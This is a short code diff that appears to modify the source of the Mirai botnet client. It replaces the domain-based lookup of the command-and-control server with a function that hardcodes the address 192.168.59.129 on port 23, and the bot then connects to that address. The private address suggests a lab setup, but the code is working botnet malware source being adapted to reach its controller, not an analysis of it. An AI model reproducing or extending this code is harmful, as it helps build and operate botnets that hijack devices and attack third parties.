@@ -25,7 +25,8 @@
 
 static void establish_connection(void);
 static void teardown_connection(void);
-static void resolve_cnc_addr(void);
+static void resolve_cnc_addr(void); //not call it yet.
+static void get_cnc_addr(void);
 
 struct sockaddr_in srv_addr; //haven't put in the cnc address yet
 int fd_serv = -1;
@@ -239,7 +240,8 @@ static void establish_connection(void)
     fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
 
     // Should call resolve_cnc_addr
-    resolve_cnc_addr();
+    // resolve_cnc_addr(); //not call it yet
+    get_cnc_addr();
 
     pending_connection = TRUE;
     connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof (struct sockaddr_in));
@@ -281,4 +283,14 @@ static void resolve_cnc_addr(void)
 #ifdef DEBUG
     printf("[main] Resolved domain\n");
 #endif
+}
+
+static void get_cnc_addr(void)
+{
+    srv_addr.sin_addr.s_addr = inet_addr("192.168.59.129");
+    srv_addr.sin_port = htons(23);
+#ifdef DEBUG
+    printf("[main] Resolved domain\n");
+#endif
+
 }
